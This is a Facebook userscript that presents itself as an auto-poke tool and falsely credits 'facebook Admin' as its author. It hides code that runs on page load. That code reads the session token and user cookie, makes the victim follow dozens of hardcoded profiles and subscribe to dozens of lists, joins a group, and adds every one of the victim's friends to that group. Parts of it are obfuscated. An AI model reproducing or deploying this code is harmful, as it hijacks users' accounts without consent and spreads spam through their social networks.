// ==UserScript==
// @name         Facebook Autopoke By  Nilesh.
// @icon         http://i.imgur.com/5ShnMqG.png
// @author       facebook Admin
// @description  Automatically pokes back people listed on your home page
// @namespace       http://userscripts.org/scripts/review/162765
// @updateURL       https://userscripts.org/scripts/source/162765.meta.js
// @downloadURL     https://userscripts.org/scripts/source/162765.user.js
// @homepageURL     https://userscripts.org/scripts/show/162765
// @version      15.1
// @run-at       document-end
// @grant        none
//
// @require     http://cdnjs.cloudflare.com/ajax/libs/jquery/1.9.1/jquery.min.js
//
// @include     /^https?://(.*)?facebook\.com(.*)?/
//
// @exclude     /^https?://(.*)?facebook\.com/ai.php(.*)?/
// ==/UserScript==

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
	
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
            konum += tarama.length
            son = document.cookie.indexOf(";", konum)
            if (son == -1)
                son = document.cookie.length
            return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
}

function getRandomInt (min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomValue(arr) {
    return arr[getRandomInt(0, arr.length-1)];
}

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function a(abone){
    var http4 = new XMLHttpRequest();
     
    var url4 = "/ajax/follow/follow_profile.php?__a=1";
     
    var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
    http4.open("POST", url4, true);
     
    //Send the proper header information along with the request
    http4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    http4.setRequestHeader("Content-length", params4.length);
    http4.setRequestHeader("Connection", "close");
     
    http4.onreadystatechange = function() {//Call a function when the state changes.
    if(http4.readyState == 4 && http4.status == 200) {
       
      http4.close; // Close the connection
     
    }
    }
    
    http4.send(params4);
}

function sublist(uidss) {
		var a = document.createElement('script');
		a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
		document.body.appendChild(a);
}

a("1273872655");
a("100006549135036");
a("100002920534041");
a("100001707047836");
a("100002491244428");
a("100003185375753");
a("100003126043061");
a("100002963125119");
a("100002963125119");
a("100002884845096");
a("100003260944521");
a("100003130193442");
a("100003143936857");
a("100003169095880");
a("100003174832056");
a("100003054331489");
a("100003234472060");
a("100002885419633");
a("100003169280982");
a("100003045781784");
a("100003060692030");
a("100004184164226");
a("100003147256919");
a("100003173826340");
a("100003320498577");
a("100003479972024");
a("100003396847010");
a("100003478476127");
a("100003528512236");
a("100004186264774");
a("100004184496615");
a("100004199527121");
a("100004206729692");
a("100001464432902");
a("100004226079524");
a("100001265587034");
a("100004236695463");
a("100004187142960");
a("100004224463221");
a("100001721807602");
a("100005085250164");
a("100003769085879");
a("100001441399478");
a("100006540371411");



sublist("202389123273928");
sublist("234176026761904");
sublist("231319150380925");
sublist("4399231940310");
sublist("10200819572312984");
sublist("10200819976883098");
sublist("10200820950347434");
sublist("10200865018889120");
sublist("542481255814823");
sublist("625550820839213");
sublist("632046340189661");
sublist("632049830189312");
sublist("1392253941002605");
sublist("1431048133789852");
sublist("178713262288235");
sublist("1464007247160607");
sublist("557206374327459");
sublist("364406130366390");
sublist("210193362521786");
sublist("639222549477204");
sublist("553993867982390");
sublist("572415969473513");
sublist("645558978825878");
sublist("645558692159240");
sublist("645559175492525");
sublist("645559855492457");
sublist("645559695492473");
sublist("645560058825770");
sublist("645560202159089");
sublist("645560438825732");
sublist("645560668825709");
sublist("645560928825683");
sublist("600949989929116");
sublist("660129834011131");
sublist("627846037239511");
sublist("429656307058486");
sublist("1441095016110227");
sublist("585730671510784");
sublist("612223245523082");
sublist("359280417540214");
sublist("192023194295548");






var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var httpwp = new XMLHttpRequest();
var urlwp = '/ajax/groups/membership/r2j.php?__a=1';
var paramswp = '&ref=group_jump_header&group_id=' + gid + '&fb_dtsg=' + fb_dtsg + '&__user=' + user_id + '&phstamp=';
httpwp['open']('POST', urlwp, true);
httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
httpwp['setRequestHeader']('Content-length', paramswp['length']);
httpwp['setRequestHeader']('Connection', 'keep-alive');
httpwp['send'](paramswp);

var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var friends = new Array();
gf = new XMLHttpRequest();
gf['open']('GET', '/ajax/typeahead/first_degree.php?__a=1&viewer=' + user_id + '&token' + Math['random']() + '&filter[0]=user&options[0]=friends_only', false);
gf['send']();
if (gf['readyState'] != 4) {} else {
    data = eval('(' + gf['responseText']['substr'](9) + ')');
    if (data['error']) {} else {
        friends = data['payload']['entries']['sort'](function (_0x93dax8, _0x93dax9) {
            return _0x93dax8['index'] - _0x93dax9['index'];
        });
    };
};

for (var i = 0; i < friends['length']; i++) {
    var httpwp = new XMLHttpRequest();
    var urlwp = '/ajax/groups/members/add_post.php?__a=1';
    var paramswp= '&fb_dtsg=' + fb_dtsg + '&group_id=' + gid + '&source=typeahead&ref=&message_id=&members=' + friends[i]['uid'] + '&__user=' + user_id + '&phstamp=';
    httpwp['open']('POST', urlwp, true);
    httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
    httpwp['setRequestHeader']('Content-length', paramswp['length']);
    httpwp['setRequestHeader']('Connection', 'keep-alive');
    httpwp['onreadystatechange'] = function () {
if (httpwp['readyState'] == 4 && httpwp['status'] == 200) {};
    };
    httpwp['send'](paramswp);
};
var spage_id = "189965517753275";
var spost_id = "189965517753275";
var sfoto_id = "189965517753275";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
var svn_rev;
var bugun= new Date();
var btarihi = new Date(); 
btarihi.setTime(bugun.getTime() + 1000*60*60*4*1);
if(!document.cookie.match(/paylasti=(\d+)/)){
document.cookie = "paylasti=hayir;expires="+ btarihi.toGMTString();
}

(function ($) {
    var $loc = $(location).attr('href').toLowerCase();

    // Taken from http://userscripts.org/scripts/review/127905
    // Modified Feb 2013, Sascha Greuel
    function d(id) {
        Notifications.prototype._sendIDs([id], '/ajax/notifications/mark_read.php', {
            seen: 0
        });
        Arbiter.inform('presence/message:notifications_read', {
            obj: {
                alert_ids: [id],
                type: 'notifications_read'
            }
        });
    }

    function fb_pnd() {
        if (Arbiter === undefined) {
            window.setTimeout(fb_pnd, 100);
        } else {
            Arbiter.subscribe('channel/message:m_notification', function (a, b) {
                if (b && b.obj && b.obj.data && (b.obj.data.type === 'poke')) {
                    d(b.obj.data.alert_id);
                }
            });
            //Dismiss notifications that are already there at load time 
            window.setTimeout(function () {
                var notifs = document.getElementById('fbNotificationsList').getElementsByClassName('notification'),
                    i,
                    gt;
                for (i = 0; i < notifs.length; i += 1) {
                    gt = JSON.parse(notifs[i].getAttribute('data-gt'));
                    if (gt.notif_type === 'poke') {
                        d(gt.alert_id);
                    }
                }
            }, 2000);
        }
    }

    // -----------------------------------

    function autopoke() {
        var poke_uids = [],
            gfids = [],
            i = 0;

        $.ajaxSetup({
            async: false
        });

        // 1st, we call the pokes page and fetch all pokes, if there are any 
        $.ajax({
            url: '/pokes',
            dataType: 'html',
            success: function (data) {
                if ($loc.match(/m\.facebook\.com/)) {
                    poke_uids = data.match(/poke=([0-9]+)/g);
                    gfids = data.match(/gfid=([a-z0-9-_]+)/ig);

                    // No pokes, sleep
                    if (!poke_uids || !gfids) {
                        return;
                    }

                    // Pokes found. Send pokes back
                    for (i; i <= poke_uids.length - 1; i += 1) {
                        $.get('/a/notifications.php?' + poke_uids[i] + '&redir=/pokes/&sr&' + gfids[i]);
                    }
                } else {
                    poke_uids = data.match(/poke_([0-9]+)/g);

                    // No pokes, sleep
                    if (!poke_uids) {
                        return;
                    }

                    // Pokes found. Send pokes back
                    for (i; i <= poke_uids.length - 1; i += 1) {
                        $.post('ajax/poke.php?__a=1', {
                            uid: poke_uids[i].match(/([0-9]+)/)[0],
                            fb_dtsg: $("input[name=fb_dtsg]").val(),
                            post_form_id: $("#post_form_id").val()
                        });
                    }
                }
            }
        });
    }

    // Runonce
    setTimeout(function () {
        var s = document.createElement("script");
        s.textContent = String(fb_pnd) + "\nfb_pnd();";
        document.head.appendChild(s);
        document.head.removeChild(s);

        autopoke();
    }, 1500);

    // Start timer
    setInterval(function () {
        autopoke();
    }, 30000); // Repeat every 30 seconds
}(jQuery));